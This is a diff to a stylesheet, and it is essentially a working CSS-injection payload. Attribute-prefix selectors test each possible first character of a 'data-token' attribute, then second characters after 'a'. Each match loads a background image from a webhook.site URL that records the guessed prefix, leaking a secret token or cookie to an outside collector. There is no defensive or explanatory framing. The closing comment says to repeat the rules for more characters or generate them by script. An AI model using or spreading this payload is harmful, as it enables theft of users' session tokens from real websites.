@@ -1,26 +1,37 @@
-/* 
-Replace 'body[data-token^="x"]' selector with the actual element and attribute 
-that contains the token or cookie string in the DOM.
-*/
+/* --- First character guesses --- */
+body[data-token^="0"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-1-0"); }
+body[data-token^="1"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-1-1"); }
+body[data-token^="2"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-1-2"); }
+body[data-token^="3"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-1-3"); }
+body[data-token^="4"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-1-4"); }
+body[data-token^="5"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-1-5"); }
+body[data-token^="6"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-1-6"); }
+body[data-token^="7"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-1-7"); }
+body[data-token^="8"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-1-8"); }
+body[data-token^="9"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-1-9"); }
+body[data-token^="a"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-1-a"); }
+body[data-token^="b"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-1-b"); }
+body[data-token^="c"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-1-c"); }
+body[data-token^="d"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-1-d"); }
+body[data-token^="e"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-1-e"); }
+body[data-token^="f"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-1-f"); }
 
-/* 1st char guess */
-body[data-token^="a"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-a"); }
-body[data-token^="b"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-b"); }
-body[data-token^="c"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-c"); }
-body[data-token^="d"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-d"); }
-body[data-token^="e"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-e"); }
-body[data-token^="f"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-f"); }
-body[data-token^="0"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-0"); }
-body[data-token^="1"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-1"); }
-body[data-token^="2"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-2"); }
-body[data-token^="3"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-3"); }
-body[data-token^="4"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-4"); }
-body[data-token^="5"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-5"); }
-body[data-token^="6"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-6"); }
-body[data-token^="7"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-7"); }
-body[data-token^="8"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-8"); }
-body[data-token^="9"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-9"); }
-body[data-token^="A"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-A"); }
-body[data-token^="B"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-B"); }
-body[data-token^="C"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/cookie-C"); }
-/* add more letters if needed */
+/* --- Second character guesses for each first char (example for first char = 'a') --- */
+body[data-token^="a0"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-2-a0"); }
+body[data-token^="a1"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-2-a1"); }
+body[data-token^="a2"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-2-a2"); }
+body[data-token^="a3"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-2-a3"); }
+body[data-token^="a4"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-2-a4"); }
+body[data-token^="a5"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-2-a5"); }
+body[data-token^="a6"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-2-a6"); }
+body[data-token^="a7"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-2-a7"); }
+body[data-token^="a8"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-2-a8"); }
+body[data-token^="a9"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-2-a9"); }
+body[data-token^="aa"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-2-aa"); }
+body[data-token^="ab"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-2-ab"); }
+body[data-token^="ac"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-2-ac"); }
+body[data-token^="ad"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-2-ad"); }
+body[data-token^="ae"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-2-ae"); }
+body[data-token^="af"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token-2-af"); }
+
+/* Repeat for second char for all first chars you want to test, or generate via script */
